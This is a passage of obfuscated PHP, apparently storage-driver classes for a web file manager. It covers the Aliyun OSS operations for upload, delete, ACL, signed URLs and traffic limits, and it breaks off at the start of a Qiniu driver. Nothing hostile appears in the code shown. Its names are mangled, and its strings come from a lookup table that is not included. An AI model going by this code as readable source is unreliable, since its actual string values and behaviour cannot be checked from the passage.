$Õè‰À•Â) { $¢¦õ²ËË = $†şİšù› + (int) $Õè‰À•Â[$µ¦„Íèß[1414]]; $ò°­è…ß = (int) $Õè‰À•Â[$µ¦„Íèß[337]] + $¢¦õ²ËË - 1; $İ²›®Æä = array($µ¦„Íèß[1415] => $¢¦õ²ËË, $µ¦„Íèß[1416] => $ò°­è…ß); $Šğ£è•ó[] = $this->client->uploadPartCopy($this->bucket, $ìá—âæÕ, $this->bucket, $this->pathEncode($íÖ´§ô), $£Ì÷Ö«, $³‘ÆÎ, $İ²›®Æä); $£Ì÷Ö« = $£Ì÷Ö« + 1; } $°Êí×¥• = array(); foreach ($Šğ£è•ó as $€®ÒïÁ´ => $¯ÒıÖ¹) { $°Êí×¥•[] = array($µ¦„Íèß[1417] => $€®ÒïÁ´ + 1, $µ¦„Íèß[1418] => $¯ÒıÖ¹); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($íÖ´§ô), $³‘ÆÎ, $°Êí×¥•); } catch (OSS\Core\OssException $èÍÄÎØÑ) { return !1; } return !0; } public function moveFile($à¬è°Ù, $‹¿ãàô) { if ($this->copyFile($à¬è°Ù, $‹¿ãàô)) { $this->remove($à¬è°Ù); return $this->getPathOuter($‹¿ãàô); } return !1; } public function delFile($§İÓ¤¾ø) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($§İÓ¤¾ø)); } catch (OSS\Core\OssException $ÇÑëÅĞ´) { return !1; } return !0; } public function delFolder($àí•ÅúÀ) { $ø§µ÷Ãó =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->exist($àí•ÅúÀ)) { return !0; } $this->listItemCache = !1; $ƒŸïÓŸ = $this->fileList($àí•ÅúÀ); $this->listItemCache = !0; $¨¯û¦¡™ = trim($àí•ÅúÀ, $ø§µ÷Ãó[8]) . $ø§µ÷Ãó[8]; if (!empty($àí•ÅúÀ) && $àí•ÅúÀ !== $ø§µ÷Ãó[197] && !in_array($¨¯û¦¡™, $ƒŸïÓŸ[$ø§µ÷Ãó[82]])) { $ƒŸïÓŸ[$ø§µ÷Ãó[82]][] = $¨¯û¦¡™; } $‰ú½â ª = $this->delByBatch($ƒŸïÓŸ[$ø§µ÷Ãó[83]]); if (!$‰ú½â ª) { return !1; } $‰ú½â ª = $this->delByBatch($ƒŸïÓŸ[$ø§µ÷Ãó[82]]); if (!$‰ú½â ª) { return !1; } return $this->delFile($¨¯û¦¡™); } private function delByBatch($®´ªˆÏñ) { foreach (array_chunk($®´ªˆÏñ, 1000) as $ÔÀäÕ÷®) { try { $this->client->deleteObjects($this->bucket, $ÔÀäÕ÷®); } catch (OSS\Core\OssException $¨ «çø™) { return !1; } } return !0; } public function rename($áÙé´´, $ıƒ•Äà×) { return $this->renameObject($áÙé´´, $ıƒ•Äà×); } private function fileInfo($³şï÷éÔ, $ÇÕ–Œ… = false, $ïÛäıÙ¶ = array()) { $şäâóİÅ =& $_SERVER[Ì¥ŞÒ°£]; $Í‘äÆŒà = array($şäâóİÅ[32] => $this->pathThis($³şï÷éÔ), $şäâóİÅ[84] => $this->getPathOuter($³şï÷éÔ), $şäâóİÅ[33] => $şäâóİÅ[199], $şäâóİÅ[76] => isset($ïÛäıÙ¶[$şäâóİÅ[76]]) ? $ïÛäıÙ¶[$şäâóİÅ[76]] : 0, $şäâóİÅ[174] => $this->ext($³şï÷éÔ)); if ($ÇÕ–Œ…) { return $Í‘äÆŒà; } $Í‘äÆŒà[$şäâóİÅ[200]] = $Í‘äÆŒà[$şäâóİÅ[85]] = 0; $Í‘äÆŒà[$şäâóİÅ[201]] = $Í‘äÆŒà[$şäâóİÅ[202]] = !0; if (empty($ïÛäıÙ¶)) { $è÷êÍ£§ = $this->objectMeta($³şï÷éÔ); if (!$è÷êÍ£§) { return $Í‘äÆŒà; } $ïÛäıÙ¶ = array($şäâóİÅ[85] => strtotime($è÷êÍ£§[$şäâóİÅ[1412]]), $şäâóİÅ[76] => $è÷êÍ£§[$şäâóİÅ[1411]] + 0); } if (isset($ïÛäıÙ¶[$şäâóİÅ[76]])) { $Í‘äÆŒà[$şäâóİÅ[76]] = $ïÛäıÙ¶[$şäâóİÅ[76]]; } if (isset($ïÛäıÙ¶[$şäâóİÅ[85]])) { $Í‘äÆŒà[$şäâóİÅ[85]] = $ïÛäıÙ¶[$şäâóİÅ[85]]; } if (isset($ïÛäıÙ¶[$şäâóİÅ[203]]) && !trim($Í‘äÆŒà[$şäâóİÅ[85]])) { $Í‘äÆŒà[$şäâóİÅ[85]] = $ïÛäıÙ¶[$şäâóİÅ[203]]; } return $Í‘äÆŒà; } private function folderInfo($œé„¨», $ãÑäÏ‡í = false, $™á©ö€Œ = array()) { $î‘÷èÉ¥ =& $_SERVER[Ì¥ŞÒ°£]; $õ‡‘ãèÍ = array($î‘÷èÉ¥[32] => $this->pathThis($œé„¨»), $î‘÷èÉ¥[84] => $this->getPathOuter($î‘÷èÉ¥[8] . $œé„¨»), $î‘÷èÉ¥[33] => $î‘÷èÉ¥[75]); if ($ãÑäÏ‡í) { return $õ‡‘ãèÍ; } $õ‡‘ãèÍ[$î‘÷èÉ¥[200]] = $õ‡‘ãèÍ[$î‘÷èÉ¥[85]] = 0; $õ‡‘ãèÍ[$î‘÷èÉ¥[201]] = $õ‡‘ãèÍ[$î‘÷èÉ¥[202]] = !0; if (empty($™á©ö€Œ)) { $œé„¨» = rtrim($œé„¨», $î‘÷èÉ¥[8]) . $î‘÷èÉ¥[8]; $ºÍ€Â£î = $this->objectMeta($œé„¨»); if (!$ºÍ€Â£î) { return $õ‡‘ãèÍ; } $™á©ö€Œ = array($î‘÷èÉ¥[200] => $ºÍ€Â£î[$î‘÷èÉ¥[511]][$î‘÷èÉ¥[1419]], $î‘÷èÉ¥[85] => strtotime($ºÍ€Â£î[$î‘÷èÉ¥[1412]])); } if (isset($™á©ö€Œ[$î‘÷èÉ¥[85]])) { $õ‡‘ãèÍ[$î‘÷èÉ¥[85]] = $™á©ö€Œ[$î‘÷èÉ¥[85]]; } if (isset($™á©ö€Œ[$î‘÷èÉ¥[200]])) { $õ‡‘ãèÍ[$î‘÷èÉ¥[200]] = $™á©ö€Œ[$î‘÷èÉ¥[200]]; } return $õ‡‘ãèÍ; } public function listPath($ÙîëÚùª, $§…×Ø¤Ê = false) { $““‹Óø =& $_SERVER[Ì¥ŞÒ°£]; $½äÄ“»¢ = $this->fileList($ÙîëÚùª, $““‹Óø[8], !0); foreach ($½äÄ“»¢[$““‹Óø[82]] as $ÕòÊâÖ => $ ·Ç¤‘²) { $½äÄ“»¢[$““‹Óø[82]][$ÕòÊâÖ] = $this->folderInfo($ ·Ç¤‘², $§…×Ø¤Ê, $ ·Ç¤‘²); } foreach ($½äÄ“»¢[$““‹Óø[83]] as $ÕòÊâÖ => $ ·Ç¤‘²) { $½äÄ“»¢[$““‹Óø[83]][$ÕòÊâÖ] = $this->fileInfo($ ·Ç¤‘²[$““‹Óø[32]], $§…×Ø¤Ê, $ ·Ç¤‘²); } return $½äÄ“»¢; } protected function infoChildren($—Ù£É©, &$Ş¤òÇ‡™) { $É³Õ™õÍ =& $_SERVER[Ì¥ŞÒ°£]; $ ­äìÎ‘ = $this->fileList($—Ù£É©, $É³Õ™õÍ[12], !0); $Ş¤òÇ‡™[$É³Õ™õÍ[78]] += count($ ­äìÎ‘[$É³Õ™õÍ[82]]); $Ş¤òÇ‡™[$É³Õ™õÍ[77]] += count($ ­äìÎ‘[$É³Õ™õÍ[83]]); foreach ($ ­äìÎ‘[$É³Õ™õÍ[83]] as $Š”†•€‘) { if (!$Š”†•€‘ || !$Š”†•€‘[$É³Õ™õÍ[76]]) { continue; } $Ş¤òÇ‡™[$É³Õ™õÍ[76]] += $Š”†•€‘[$É³Õ™õÍ[76]]; } } public function has($ÄÄòã§, $·¶ÄÒ¦š = false, $Š“¶ÈîŞ = true) { $ĞÊ‡íç” =& $_SERVER[Ì¥ŞÒ°£]; $ÄÄòã§ = trim($ÄÄòã§, $ĞÊ‡íç”[8]); $Ú´®« = empty($ÄÄòã§) && $ÄÄòã§ !== $ĞÊ‡íç”[197] ? $ĞÊ‡íç”[12] : $ÄÄòã§ . $ĞÊ‡íç”[8]; $õ‚õü¨Õ = $ĞÊ‡íç”[12]; $œÆ€…â© = 500; $™óúßµú = $É„Ï£èÍ = 0; while (!0) { check_abort(); $ÓŒµ‹®û = array($ĞÊ‡íç”[1407] => $ĞÊ‡íç”[8], $ĞÊ‡íç”[1408] => $Ú´®«, $ĞÊ‡íç”[1409] => $œÆ€…â©, $ĞÊ‡íç”[1410] => $õ‚õü¨Õ); try { $ØÓ®÷ƒ = $this->client->listObjects($this->bucket, $ÓŒµ‹®û); } catch (OSS\Core\OssException $³‚‰›Ÿ) { break; } $õ‚õü¨Õ = $ØÓ®÷ƒ->getNextMarker(); $ï†Ôú’¯ = $ØÓ®÷ƒ->getObjectList(); $èÍ“Ê¯¾ = $ØÓ®÷ƒ->getPrefixList(); if ($·¶ÄÒ¦š) { if (count($ï†Ôú’¯) > 1 || count($ï†Ôú’¯) == 1 && $ï†Ôú’¯[0]->getKey() != $Ú´®«) { $™óúßµú += count($ï†Ôú’¯) - 1; } if (!empty($èÍ“Ê¯¾)) { $É„Ï£èÍ += count($èÍ“Ê¯¾); } if ($õ‚õü¨Õ === $ĞÊ‡íç”[12]) { break; } continue; } if ($Š“¶ÈîŞ) { if (!empty($ï†Ôú’¯)) { if (count($ï†Ôú’¯) > 1 || $ï†Ôú’¯[0]->getKey() != $Ú´®«) { return !0; } } } else { if (!empty($èÍ“Ê¯¾)) { return !0; } } if ($õ‚õü¨Õ === $ĞÊ‡íç”[12]) { break; } } if ($·¶ÄÒ¦š) { return array($ĞÊ‡íç”[207] => $™óúßµú, $ĞÊ‡íç”[208] => $É„Ï£èÍ); } return !1; } public function listAll($ÎÒ—¶›‹) { $í‚‰çÌØ =& $_SERVER[Ì¥ŞÒ°£]; $ÁİğŠ = $this->fileList($ÎÒ—¶›‹, $í‚‰çÌØ[12], !0); $¦è—Á¸Ã = array(); foreach ($ÁİğŠ[$í‚‰çÌØ[83]] as $«ÑÛı²) { $¦è—Á¸Ã[$«ÑÛı²[$í‚‰çÌØ[32]]] = $«ÑÛı²[$í‚‰çÌØ[76]]; } foreach ($ÁİğŠ[$í‚‰çÌØ[82]] as $«ÑÛı²) { if (is_string($«ÑÛı²)) { $¦è—Á¸Ã[$«ÑÛı²] = 0; } } return $this->listAllFiles($ÎÒ—¶›‹, array_keys($¦è—Á¸Ã), $¦è—Á¸Ã); } public function canRead($ âÚ) { $•‚Î¹Òè =& $_SERVER[Ì¥ŞÒ°£]; $›¤ä³ø = $this->pathAcl($ âÚ); return $›¤ä³ø == $•‚Î¹Òè[1420] || $›¤ä³ø == $•‚Î¹Òè[556] ? !0 : !1; } public function canWrite($öñ•Ş©˜) { $ÁóÊÁÌğ = $this->pathAcl($öñ•Ş©˜); return $ÁóÊÁÌğ == $_SERVER[Ì¥ŞÒ°£][556] ? !0 : !1; } public function pathAcl($ÄÕ¼‰Š¼) { $¤¯ÆÅ¦ô =& $_SERVER[Ì¥ŞÒ°£]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ªµ”£€ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ÄÕ¼‰Š¼)); } catch (OSS\Core\OssException $™—Óßù¼) { return !1; } $†Ñ‡Öº = $ªµ”£€ == $¤¯ÆÅ¦ô[37] ? $this->bucketAcl : $ªµ”£€; if ($†Ñ‡Öº == $¤¯ÆÅ¦ô[1421]) { return $¤¯ÆÅ¦ô[1420]; } if ($†Ñ‡Öº == $¤¯ÆÅ¦ô[1422]) { return $¤¯ÆÅ¦ô[556]; } return $†Ñ‡Öº; } private function chmodPath($ê½¨àç¼, $ÀÜ´‰¶ê = '') { $ô˜©íà¾ =& $_SERVER[Ì¥ŞÒ°£]; $¡¢„§Šõ = empty($ÀÜ´‰¶ê) ? $ô˜©íà¾[1422] : $ÀÜ´‰¶ê; $­õöø„ä = array($ô˜©íà¾[37], $ô˜©íà¾[198], $ô˜©íà¾[1421], $ô˜©íà¾[1422]); if (!in_array($¡¢„§Šõ, $­õöø„ä)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ê½¨àç¼), $¡¢„§Šõ); } catch (OSS\Core\OssException $Ü‹ö÷¶ï) { return !1; } return !0; } public function getContent($åË†ƒ«ê) { return $this->fileSubstr($åË†ƒ«ê, -1); } public function setContent($èË¤ŠÁ¬, $Òã†şØë = '') { $ñ¿Ò¥¹’ =& $_SERVER[Ì¥ŞÒ°£]; try { $ «Š®›´ = $this->trafficLimit($ñ¿Ò¥¹’[1423]); $‚Ò¸º€¦ = $this->client->putObject($this->bucket, $this->pathEncode($èË¤ŠÁ¬), $Òã†şØë, $ «Š®›´); } catch (OSS\Core\OssException $ïí‹ÏªÒ) { return !1; } $Ú¶Ççµ¦ = array($ñ¿Ò¥¹’[1413] => trim($‚Ò¸º€¦[$ñ¿Ò¥¹’[1424]], $ñ¿Ò¥¹’[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($èË¤ŠÁ¬))); $this->updateObjMeta($èË¤ŠÁ¬, $Ú¶Ççµ¦); return isset($‚Ò¸º€¦[$ñ¿Ò¥¹’[1425]][$ñ¿Ò¥¹’[1372]]) ? !0 : !1; } private function updateObjMeta($­·Ì¢¬, $‹ºÅ µ) { $­·Ì¢¬ = $this->pathEncode($­·Ì¢¬); try { $ÀÌ¹¨ = array(OSS\OssClient::OSS_HEADERS => $‹ºÅ µ); $this->client->copyObject($this->bucket, $­·Ì¢¬, $this->bucket, $­·Ì¢¬, $ÀÌ¹¨); } catch (OSS\Core\OssException $±ˆ•ï) { return !1; } return !0; } public function upload($İŸ¶ñÛù, $„âÀ›òè, $½ŒŸÌ‘Ú = false, $šíÚ˜Ùõ = REPEAT_REPLACE) { $…ĞªÃ¯É =& $_SERVER[Ì¥ŞÒ°£]; $„­£ùÂ = trim($İŸ¶ñÛù, $…ĞªÃ¯É[8]); $Õ³š¶ù = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($…ĞªÃ¯É[1413] => @md5_file($„âÀ›òè)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($İŸ¶ñÛù))); $Õ³š¶ù = $this->trafficLimit($…ĞªÃ¯É[1423], $Õ³š¶ù); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($„­£ùÂ), $„âÀ›òè, $Õ³š¶ù); } catch (OSS\Core\OssException $¤àäİÄ³) { return !1; } return $this->getPathOuter($İŸ¶ñÛù); } public function getHost() { $’¤ö°Åº =& $_SERVER[Ì¥ŞÒ°£]; $éŠœúâã = explode($’¤ö°Åº[183], parent::getHost()); return $éŠœúâã[0] . $’¤ö°Åº[183] . $this->bucket . $’¤ö°Åº[10] . $éŠœúâã[1]; } public function uploadFormData($ÍÔĞÙİ, $¥Ÿú¾Ù­ = 3600) { $¤®á’¡  =& $_SERVER[Ì¥ŞÒ°£]; if (!($éÓ§ÌÄƒ = $this->getHost())) { return !1; } $Œô¶Ş‡Å = $¥Ÿú¾Ù­; $…šÓÄÒ = date($¤®á’¡ [1426], time() + $Œô¶Ş‡Å); $Ö›±»êÚ = new DateTime($…šÓÄÒ); $ßÍÆÔ¼£ = $Ö›±»êÚ->format(DateTime::ISO8601); $˜úâ§ÓÎ = strpos($ßÍÆÔ¼£, $¤®á’¡ [296]); $ßÍÆÔ¼£ = substr($ßÍÆÔ¼£, 0, $˜úâ§ÓÎ) . $¤®á’¡ [1427]; $€…ı·¿Î = 1048576000 * 5; $†Ñ¸÷¦Á = $this->pathFather($ÍÔĞÙİ); $æÓ×Ú¾ˆ = array($¤®á’¡ [1326] => $ßÍÆÔ¼£, $¤®á’¡ [1327] => array(array($¤®á’¡ [1428], 0, $€…ı·¿Î), array($¤®á’¡ [1330], $¤®á’¡ [1331], $†Ñ¸÷¦Á))); $à•ûî• = base64_encode(json_encode($æÓ×Ú¾ˆ)); $øÅ´ï«Ä = base64_encode(hash_hmac($¤®á’¡ [232], $à•ûî•, $this->secret, !0)); $ø–É™‰£ = array($¤®á’¡ [1336] => $à•ûî•, $¤®á’¡ [1429] => $this->accessKey, $¤®á’¡ [1332] => $¤®á’¡ [1324], $¤®á’¡ [1430] => $øÅ´ï«Ä, $¤®á’¡ [181] => $éÓ§ÌÄƒ); $ø–É™‰£ = $this->trafficLimit($¤®á’¡ [1423], $ø–É™‰£); return $ø–É™‰£; } public function multiUploadFormData($ƒëÆòšû, $­Íëãñæ = 3600) { $©éò×Ñ÷ =& $_SERVER[Ì¥ŞÒ°£]; if (!($¨„ûğÔ = $this->getHost())) { return !1; } $„¼Ğ”‹Œ = $this->trafficLimit($©éò×Ñ÷[1423]); $ìÊÁÂûï = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ƒëÆòšû), $„¼Ğ”‹Œ); return array($©éò×Ñ÷[223] => $ìÊÁÂûï, $©éò×Ñ÷[181] => $¨„ûğÔ . $©éò×Ñ÷[8] . $this->pathEncode($ƒëÆòšû), $©éò×Ñ÷[224] => gmdate($©éò×Ñ÷[1431]), $©éò×Ñ÷[94] => $ƒëÆòšû); } public function multiUploadAuthData($õú‹ªÊ, $³ãªúÄÜ = array()) { $ı‹¡´Š =& $_SERVER[Ì¥ŞÒ°£]; $‰õ©í±ş = isset($³ãªúÄÜ[$ı‹¡´Š[224]]) ? $³ãªúÄÜ[$ı‹¡´Š[224]] : gmdate($ı‹¡´Š[1431]); $ä¹•¿èÕ = isset($³ãªúÄÜ[$ı‹¡´Š[174]]) ? $³ãªúÄÜ[$ı‹¡´Š[174]] : $ı‹¡´Š[12]; $¾¦ÇüÑƒ = $õú‹ªÊ; if (isset($³ãªúÄÜ[$ı‹¡´Š[94]])) { $¾¦ÇüÑƒ = $³ãªúÄÜ[$ı‹¡´Š[94]]; unset($³ãªúÄÜ[$ı‹¡´Š[94]]); } if (isset($³ãªúÄÜ[$ı‹¡´Š[225]])) { $³ãªúÄÜ[$ı‹¡´Š[224]] = $‰õ©í±ş; return $this->listUploadParts($¾¦ÇüÑƒ, $³ãªúÄÜ); } $ÏƒîÏÄò = array($ı‹¡´Š[226], $ı‹¡´Š[12], $ı‹¡´Š[120], $‰õ©í±ş, "\x78\x2d\x6f\163\x73\x2d\x64\141\164\145\72{$‰õ©í±ş}", $ı‹¡´Š[8] . $this->bucket . $ı‹¡´Š[8] . $¾¦ÇüÑƒ . $ä¹•¿èÕ); if (strpos($ä¹•¿èÕ, $ı‹¡´Š[227]) === 0) { $ÏƒîÏÄò[0] = $ı‹¡´Š[228]; if ($‰Àõ‰¹“ = $this->trafficLimit($ı‹¡´Š[1423])) { $¾¦ÇüÑƒ = $ı‹¡´Š[1432]; array_splice($ÏƒîÏÄò, 5, 0, $¾¦ÇüÑƒ . $ı‹¡´Š[4] . $‰Àõ‰¹“[$¾¦ÇüÑƒ]); } } if (isset($³ãªúÄÜ[$ı‹¡´Š[229]]) && $³ãªúÄÜ[$ı‹¡´Š[229]] == $ı‹¡´Š[230]) { $ÏƒîÏÄò[0] = $ı‹¡´Š[230]; } if (!empty($³ãªúÄÜ[$ı‹¡´Š[1433]])) { $íõ€ç = array_merge(array($ÏƒîÏÄò[4]), $³ãªúÄÜ[$ı‹¡´Š[1433]]); sort($íõ€ç); $ÏƒîÏÄò[4] = implode($ı‹¡´Š[231], $íõ€ç); } $öØÚ¯ªÂ = implode($ı‹¡´Š[231], $ÏƒîÏÄò); $úÄ¬Ù = base64_encode(hash_hmac($ı‹¡´Š[232], $öØÚ¯ªÂ, $this->secret, !0)); $ÂŸØè©¼ = $ı‹¡´Š[1397] . $this->accessKey . $ı‹¡´Š[4] . $úÄ¬Ù; if (strpos($ä¹•¿èÕ, $ı‹¡´Š[227]) === 0) { $ÂŸØè©¼ = array($ı‹¡´Š[234] => $ÂŸØè©¼, $ı‹¡´Š[224] => $‰õ©í±ş); if ($‰Àõ‰¹“) { $ÂŸØè©¼ = array_merge($ÂŸØè©¼, $‰Àõ‰¹“); } } return $ÂŸØè©¼; } public function listUploadParts($ËÑ­œÚ¸, $Óğä×) { $ã°êôøŸ =& $_SERVER[Ì¥ŞÒ°£]; $¸­çæéø = parse_url_query($Óğä×[$ã°êôøŸ[174]]); $˜ŠÜ—ŸÓ = $this->client->listParts($this->bucket, $this->pathEncode($ËÑ­œÚ¸), $¸­çæéø[$ã°êôøŸ[223]]); $Š“Ã–£ = $˜ŠÜ—ŸÓ->getListPart(); $†¦Ó¥¤ = array(); foreach ($Š“Ã–£ as $ï¤¯’å«) { $†¦Ó¥¤[] = array($ã°êôøŸ[1417] => $ï¤¯’å«->getPartNumber(), $ã°êôøŸ[1418] => trim($ï¤¯’å«->getETag(), $ã°êôøŸ[118])); } unset($Óğä×[$ã°êôøŸ[225]], $Óğä×[$ã°êôøŸ[229]]); $Ó•Ûß’º = $this->multiUploadAuthData($ËÑ­œÚ¸, $Óğä×); if (empty($Ó•Ûß’º)) { return !1; } return array($ã°êôøŸ[234] => $Ó•Ûß’º, $ã°êôøŸ[224] => $Óğä×[$ã°êôøŸ[224]], $ã°êôøŸ[236] => $†¦Ó¥¤); } public function download($òê‚Ç×é, $¿úº½¦¨) { if ($this->isFolder($òê‚Ç×é)) { return !1; } try { $ƒú–éÜÄ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¿úº½¦¨); $ƒú–éÜÄ = $this->trafficLimit($_SERVER[Ì¥ŞÒ°£][109], $ƒú–éÜÄ); $this->client->getObject($this->bucket, $this->pathEncode($òê‚Ç×é), $ƒú–éÜÄ); } catch (OSS\Core\OssException $ìµºØİ¡) { return !1; } return $¿úº½¦¨; } public function fileSubstr($œò÷á¿š, $Á””õ¬ó = 0, $ó÷ÆµÉ» = false) { if ($Á””õ¬ó === -1) { $±¥õÂç = array(); } else { if ($ó÷ÆµÉ» === !1) { $Å·µ’¦ = $this->size($œò÷á¿š); } else { $Å·µ’¦ = $Á””õ¬ó + $ó÷ÆµÉ» - 1; } $±¥õÂç = array(OSS\OssClient::OSS_RANGE => "{$Á””õ¬ó}\x2d{$Å·µ’¦}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($œò÷á¿š), $±¥õÂç); } catch (OSS\Core\OssException $³ï£Êû˜) { think_exception($³ï£Êû˜->getMessage()); return !1; } } private function trafficLimit($‹ÆáÓ’â, $¥Çßß°§ = array()) { $ÊÈÄ ğ¹ =& $_SERVER[Ì¥ŞÒ°£]; if ($‹ÆáÓ’â == $ÊÈÄ ğ¹[1423] && $this->isUploadServer() || $‹ÆáÓ’â == $ÊÈÄ ğ¹[109] && $this->isFileOutServer()) { return $¥Çßß°§; } $†•ŠÊŞ = floatval($GLOBALS[$ÊÈÄ ğ¹[6]][$ÊÈÄ ğ¹[89]][$ÊÈÄ ğ¹[107]][$‹ÆáÓ’â]) * 1024 * 1024 * 8; if (!$†•ŠÊŞ) { return $¥Çßß°§; } $†•ŠÊŞ = $†•ŠÊŞ < 819200 ? 819200 : ($†•ŠÊŞ > 838860800 ? 838860800 : $†•ŠÊŞ); $¥Çßß°§[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($†•ŠÊŞ); return $¥Çßß°§; } public function link($™¿èïø¨, $ü‡¸Ö†“ = array()) { $‡˜ÍÉ÷ì =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->exist($™¿èïø¨) || $this->isFolder($™¿èïø¨)) { return !1; } try { $ü‡¸Ö†“ = $this->trafficLimit($‡˜ÍÉ÷ì[109], $ü‡¸Ö†“); $Ï²Úñ¿ = $this->client->signUrl($this->bucket, $this->pathEncode($™¿èïø¨), 3600 * 12, $‡˜ÍÉ÷ì[230], $ü‡¸Ö†“); return $this->getCdnLink($Ï²Úñ¿); } catch (OSS\Core\OssException $Ä»ŒÛæ«) { return !1; } } public function fileOut($ëÙıƒò, $à¼ÑÃí° = false, $ÁåÔûÎÛ = false, $úè¿÷ = '') { $şÆ¶é =& $_SERVER[Ì¥ŞÒ°£]; if ($this->isFileOutServer()) { return $this->fileOutServer($ëÙıƒò, $à¼ÑÃí°, $ÁåÔûÎÛ, $úè¿÷); } if (!$ÁåÔûÎÛ) { $ÁåÔûÎÛ = $this->pathThis($ëÙıƒò); } $ÁåÔûÎÛ = rawurlencode($ÁåÔûÎÛ); $÷€Òàšİ = get_file_mime(get_path_ext($ÁåÔûÎÛ)); if ($÷€Òàšİ == $şÆ¶é[217]) { return parent::fileOut($ëÙıƒò, $à¼ÑÃí°, $ÁåÔûÎÛ, $úè¿÷); } $à¼ÑÃí° = $à¼ÑÃí° ? $şÆ¶é[1434] : $şÆ¶é[1435]; $æÙõàº = array(OSS\OssClient::OSS_SUB_RESOURCE => $şÆ¶é[1436] . rawurlencode("{$à¼ÑÃí°}\x3b\x66\x69\154\145\x6e\x61\155\x65\75{$ÁåÔûÎÛ}")); $æÙõàº[OSS\OssClient::OSS_SUB_RESOURCE] .= $şÆ¶é[1437] . rawurlencode($÷€Òàšİ); $Å£Ïºı = $this->link($ëÙıƒò, $æÙõàº); $this->fileOutLink($Å£Ïºı); } public function fileOutServer($¼ŠÜÚ—Ö, $ÛİòÖäØ = false, $âÇô€î = false, $şÍøÚ¿¤ = '') { parent::fileOut($¼ŠÜÚ—Ö, $ÛİòÖäØ, $âÇô€î, $şÍøÚ¿¤); } public function fileOutImage($Ì– ¡¬Ñ, $ëŸ‹í¿‘ = 250) { $·›ÃØ‰ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ì¥ŞÒ°£][1438] . $ëŸ‹í¿‘); $“¼¸“ñ° = $this->link($Ì– ¡¬Ñ, $·›ÃØ‰); $this->fileOutLink($“¼¸“ñ°); } public function fileOutImageServer($Ä˜ŸŞƒ, $êŞ·äˆ = 250) { parent::fileOutImage($Ä˜ŸŞƒ, $êŞ·äˆ); } public function fileOutLink($²Õ¬ä‚–) { $‰²¿œş… =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->isCdnHost() && substr($²Õ¬ä‚–, 0, 7) == $‰²¿œş…[1339]) { $²Õ¬ä‚– = $‰²¿œş…[1340] . substr($²Õ¬ä‚–, 7); } header($‰²¿œş…[161] . $²Õ¬ä‚–); die; } public function hashMd5($×¤´šéö, $ê‰‚†â– = '') { $ÌÇ©ÎÈ =& $_SERVER[Ì¥ŞÒ°£]; $”üÊÜÎı = $this->_objectMeta($×¤´šéö); if (!$”üÊÜÎı) { return $ÌÇ©ÎÈ[12]; } if (!isset($”üÊÜÎı[$ÌÇ©ÎÈ[1413]]) && !empty($ê‰‚†â–)) { $íÏ¸¯ÛÓ = $this->updateObjMeta($×¤´šéö, array($ÌÇ©ÎÈ[1413] => $ê‰‚†â–)); $”üÊÜÎı[$ÌÇ©ÎÈ[1413]] = $íÏ¸¯ÛÓ ? $ê‰‚†â– : $ÌÇ©ÎÈ[12]; } return isset($”üÊÜÎı[$ÌÇ©ÎÈ[1413]]) ? strtolower($”üÊÜÎı[$ÌÇ©ÎÈ[1413]]) : $ÌÇ©ÎÈ[12]; } public function size($Î÷“ÍÍˆ) { $õªÔÕšê = $this->objectMeta($Î÷“ÍÍˆ); return $õªÔÕšê ? $õªÔÕšê[$_SERVER[Ì¥ŞÒ°£][76]] : 0; } public function info($Ú‹çĞÂÇ) { if ($this->isFolder($Ú‹çĞÂÇ)) { return $this->folderInfo($Ú‹çĞÂÇ); } else { if ($this->isFile($Ú‹çĞÂÇ)) { return $this->fileInfo($Ú‹çĞÂÇ); } } return !1; } public function exist($ìõİ‡¸É) { return $this->isFile($ìõİ‡¸É) || $this->isFolder($ìõİ‡¸É); } public function isFile($Òˆ²ÚâÌ) { return !$this->isFolder($Òˆ²ÚâÌ) && $this->objectMeta($Òˆ²ÚâÌ); } public function isFolder($à·Ü¤ƒù) { return $this->cacheMethod($_SERVER[Ì¥ŞÒ°£][165], $à·Ü¤ƒù); } protected function objectMeta($á‡ÑÉÒñ) { return $this->cacheMethod($_SERVER[Ì¥ŞÒ°£][167], $á‡ÑÉÒñ); } protected function _objectMeta($˜â­š×) { $íÙ“¶ğÚ =& $_SERVER[Ì¥ŞÒ°£]; try { $Î™±¼äı = $this->client->getObjectMeta($this->bucket, $this->pathEncode($˜â­š×)); } catch (OSS\Core\OssException $ªé‰ÒŠ´) { $Î™±¼äı = !1; } if ($Î™±¼äı) { $Î™±¼äı[$íÙ“¶ğÚ[76]] = intval($Î™±¼äı[$íÙ“¶ğÚ[1411]]); } return $Î™±¼äı; } protected function _isFolder($¯øì½ÏÑ) { $ÖÑ‹›—¥ =& $_SERVER[Ì¥ŞÒ°£]; if ($¯øì½ÏÑ == $ÖÑ‹›—¥[12] || $¯øì½ÏÑ == $ÖÑ‹›—¥[8]) { return !0; } $µş—î´¿ = array($ÖÑ‹›—¥[1407] => $ÖÑ‹›—¥[8], $ÖÑ‹›—¥[1408] => rtrim($¯øì½ÏÑ, $ÖÑ‹›—¥[8]) . $ÖÑ‹›—¥[8], $ÖÑ‹›—¥[1409] => 1, $ÖÑ‹›—¥[1410] => $ÖÑ‹›—¥[12]); $¶‹ä×¸ = $this->client->listObjects($this->bucket, $µş—î´¿); if ($¶‹ä×¸->getObjectList() || $¶‹ä×¸->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function 